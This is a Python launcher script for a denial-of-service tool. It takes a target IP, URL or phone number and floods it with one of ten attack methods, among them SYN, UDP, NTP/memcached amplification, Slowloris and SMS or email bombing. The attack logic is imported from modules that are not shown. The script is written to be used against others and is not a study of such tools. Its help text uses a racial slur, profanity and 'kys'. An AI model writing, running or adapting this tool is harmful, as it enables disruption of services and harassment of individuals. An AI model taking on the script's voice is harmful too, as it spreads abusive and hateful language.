# Created by nullvex
# Import modules
import os
import sys
import argparse

# Go to current dir
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("yea yk this is an error you js did a wrong bullshit dumbass check yo wifi and if it has no problem then...idk kys", err)
    sys.exit(1)

# Parse args
parser = argparse.ArgumentParser(description="my first Denial of service tool!!")
parser.add_argument(
    "--target",
    type=str,
    metavar="<IP:PORT, URL, PHONE>",
    help="bro type in the fucking ip adress you wanna fuck in IP:PORT,if you wanna fuck a website just paste the goddamn url into URL,if yiu wanna fuck a poor dudes phone number who i dont think if it even works just put in the phone number into PHONE...bom what else dumbass",
)
parser.add_argument(
    "--method",
    type=str,
    metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
    help="the attack method dumbass what did you think?",
)
parser.add_argument(
    "--time", type=int, default=10, metavar="<time>", help="js type in how long you wanna fuck up yo target nigga for example: 200 "
)
parser.add_argument(
    "--threads", type=int, default=3, metavar="<threads>", help="js type in the number of fucking threads dumbass from 1 to 200 for example: 187"
)

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target

if __name__ == "__main__":
    # Print help
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)

    # Run ddos attack
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
